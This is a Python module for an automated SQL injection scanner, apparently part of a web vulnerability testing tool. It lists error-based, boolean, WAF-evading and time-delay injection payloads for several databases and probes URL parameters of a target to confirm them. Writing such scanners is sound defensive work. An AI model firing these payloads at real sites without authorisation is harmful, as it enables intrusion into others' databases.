import re
import hashlib
from core.ui import vuln, CYN, RED, GRY, RESET
from core.http import http_probe
from . import BaseScanner

SQLI_PAYLOADS = [
    # Error Based (Broadened syntax errors for massive coverage)
    ("'",             "quote",       "error"),
    ("''",            "double-quote","error"),
    ("\\",            "backslash",   "error"),
    ("\"",            "d-quote",     "error"),
    ("`",             "backtick",    "error"),
    ("')",            "quote-paren", "error"),
    ("') AND ('1'='1", "quote-and",   "error"),
    ("PERCENT",       "percent-enc", "error", "%27"),

    # Boolean Based (WAF Evading forms included)
    ("1 AND 1=1",     "bool-true",   "boolean"),
    ("1 AND 1=2",     "bool-false",  "boolean"),
    ("' OR '1'='1",   "or-true",     "boolean"),
    ("' OR '1'='2",   "or-false",    "boolean"),
    ('") OR ("1"="1', "or-paren-true","boolean"),
    ('") OR ("1"="2', "or-paren-false", "boolean"),
    
    # WAF Evading Boolean (Uses comments, math, and alternatives)
    ("1/**/AND/**/1=1", "waf-bool-t(cmt)", "boolean"),
    ("1/**/AND/**/1=2", "waf-bool-f(cmt)", "boolean"),
    ("'||1=1-- -",    "waf-or-t(pipe)",  "boolean"),
    ("'||1=2-- -",    "waf-or-f(pipe)",  "boolean"),
    ("1 AND 1582=1582", "waf-math-t", "boolean"),
    ("1 AND 1582=1583", "waf-math-f", "boolean"),

    # Time Based (Database Specific & Aggressive)
    ("1 AND SLEEP(5)","sleep-mysql", "time"),
    ("1 AND SLEEP(5)--", "sleep-mysql-cmt", "time"),
    ("1; SELECT pg_sleep(5)--","sleep-pgsql","time"),
    ("1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -", "sleep-mysql-subq", "time"),
    ("1 AND 1=1 WAITFOR DELAY '0:0:5'--","sleep-mssql","time"),
    ("1'; WAITFOR DELAY '0:0:5'--","sleep-mssql2","time"),
    ("1 OR SLEEP(5)","sleep-or",    "time"),
    ("1' || DBMS_PIPE.RECEIVE_MESSAGE(c,5) || '", "sleep-oracle", "time"),
    ("1%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27--", "sleep-mssql-enc", "time")
]
TIME_SQLI_THRESHOLD_MS = 4500
SQLI_ERRORS = re.compile(
    r"(sql syntax|mysql_fetch|pg_query|ORA-\d{4,}|SQLite.*error"
    r"|you have an error in your sql|unclosed quotation mark"
    r"|quoted string not properly terminated|syntax error.*sql"
    r"|Microsoft OLE DB|ODBC.*Driver|Warning.*mysql_"
    r"|supplied argument is not a valid MySQL|Column count doesn't match)",
    re.I
)

def _median(vals):
    if not vals: return 0
    s = sorted(vals)
    return s[len(s)//2]

class SQLiScanner(BaseScanner):
    async def scan(self, url: str) -> list:
        findings = []
        await self._waf_sleep()
        parsed, params = self._get_params(url)
        if not params: return findings

        base_code, base_body, _, _ = await http_probe(self.session, url, timeout=8)
        if base_code != 200: return findings
        
        for param in list(params.keys())[:5]:
            confirmed = False
            orig_val = params[param][0]
            for payload_tuple in SQLI_PAYLOADS:
                if confirmed: break
                
                payload = payload_tuple[0]
                tag = payload_tuple[1]
                ptype = payload_tuple[2]
                raw_payload = payload_tuple[3] if len(payload_tuple) > 3 else payload
                
                test_params = dict(params)
                test_params[param] = [str(orig_val) + raw_payload]
                test_url = self._build_url(parsed, test_params)
                
                probe_timeout = 12 if ptype == "time" else 8
                code2, body2, _, ms2 = await http_probe(self.session, test_url, timeout=probe_timeout)
                await self._waf_sleep()
                
                # Rate limit safety
                if self.waf_detected and code2 in (403, 406, 429, 503):
                    from core.rate_limit import RATE_LIMITER
                    await RATE_LIMITER.report_blocked()
                    continue

                # Error-based
                if ptype == "error" and SQLI_ERRORS.search(body2):
                    m = SQLI_ERRORS.search(body2)
                    if m and not SQLI_ERRORS.search(base_body):
                        vuln(f"SQLi ERROR-BASED: {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {payload}"+RESET)
                        findings.append({"type":"SQLi","url":url,"param":param,
                                         "payload":payload,"evidence":m.group(0)[:120],
                                         "method":"error-based"})
                        confirmed = True
                
                # Boolean-based (Uses robust baseline comparison to avoid false positives)
                if ptype == "boolean" and "-false" in tag and not confirmed:
                    true_payload = raw_payload.replace("=2", "=1").replace("1583", "1582")
                    false_payload = raw_payload
                    
                    true_sizes, false_sizes = [], []
                    for _ in range(3):
                        tp = dict(params)
                        tp[param] = [str(orig_val) + true_payload]
                        true_url = self._build_url(parsed, tp)
                        _, bt, _, _ = await http_probe(self.session, true_url, timeout=8)
                        true_sizes.append(len(bt))

                        fp = dict(params)
                        fp[param] = [str(orig_val) + false_payload]
                        false_url = self._build_url(parsed, fp)
                        _, bf, _, _ = await http_probe(self.session, false_url, timeout=8)
                        false_sizes.append(len(bf))

                    tmed = _median(true_sizes)
                    fmed = _median(false_sizes)
                    tvar = (max(true_sizes)-min(true_sizes)) if true_sizes else 0
                    fvar = (max(false_sizes)-min(false_sizes)) if false_sizes else 0
                    base_len = len(base_body)
                    
                    # Ensure true condition matches baseline more closely than false condition, 
                    # and that there is a significant verifiable difference.
                    if abs(tmed - fmed) > 300 and tvar < 150 and fvar < 150:
                        if abs(base_len - tmed) < abs(base_len - fmed):
                            vuln(f"SQLi BOOLEAN-BASED: {url}")
                            print(GRY+"│    "+RESET+CYN+f"param: {param}  true={tmed}b  false={fmed}b"+RESET)
                            findings.append({"type":"SQLi","url":url,"param":param,
                                             "payload": tag, "method":"boolean-based","size_diff":abs(tmed-fmed)})
                            confirmed = True

                # Time-based (Strict statistical verification)
                if ptype == "time" and not confirmed:
                    if ms2 >= TIME_SQLI_THRESHOLD_MS:
                        # Baseline verification
                        _, _, _, ms_base = await http_probe(self.session, url, timeout=8)
                        
                        # Zero-sleep verification (using 0 to prove execution context control)
                        zparams = dict(params)
                        zero_payload = raw_payload.replace("5", "0")
                        zparams[param] = [str(orig_val) + zero_payload]
                        zurl = self._build_url(parsed, zparams)
                        _, _, _, ms_zero = await http_probe(self.session, zurl, timeout=8)
                        
                        if (ms2 - ms_zero) >= 4000 and ms2 > max(ms_base * 3, 1500) and ms_zero < 2000:
                            vuln(f"SQLi TIME-BASED: {url}")
                            print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {payload}"+RESET)
                            findings.append({"type":"SQLi","url":url,"param":param,
                                             "payload":payload,"method":"time-based","sleep0_ms":ms_zero})
                            confirmed = True

        return findings
